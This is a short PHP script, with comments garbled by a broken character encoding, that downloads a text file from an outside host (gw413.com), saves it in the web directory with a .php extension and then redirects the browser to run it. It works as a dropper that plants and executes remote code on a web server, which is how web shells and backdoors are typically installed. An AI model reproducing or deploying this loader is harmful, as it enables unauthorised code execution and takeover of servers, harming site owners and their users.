
<?php 

class runtime { 

function get_microtime(){list($usec, $sec) = explode(' ', microtime()); 
return ((float)$usec + (float)$sec);} 
function start() {$this->StartTime = $this->get_microtime();} 
function stop() {$this->StopTime = $this->get_microtime();} 
function spent() { return round(($this->StopTime - $this->StartTime) * 1000, 1);} 
} 
$runtime= new runtime; 
$runtime->start(); 
 
$destination_folder = './'; // ���ص��ļ�����Ŀ¼��������б�ܽ�β 
if(!is_dir($destination_folder)) //�ж�Ŀ¼�Ƿ���� 
mkdir($destination_folder,0777); //�����򴴽���������777Ȩ�� windows���� 
$url = "http://gw413.com/up/update.txt"; 
$headers = get_headers($url, 1); //�õ��ļ���С 
if ((!array_key_exists("Content-Length", $headers))) {$filesize=0; } 
$newfname = $destination_folder . basename($url).".php"; 
$file = fopen ($url, "rb"); 
if ($file) { 
$newf = fopen ($newfname, "wb"); 
if ($newf) 
while(!feof($file)) {fwrite($newf, fread($file, 1024 * 8 ), 1024 * 8 );} 
} 
if ($file) {fclose($file);} 
if ($newf) {fclose($newf);} 
$runtime->stop(); 
echo "<script>window.location.href='".basename($url).".php"."';</script>";

?> 
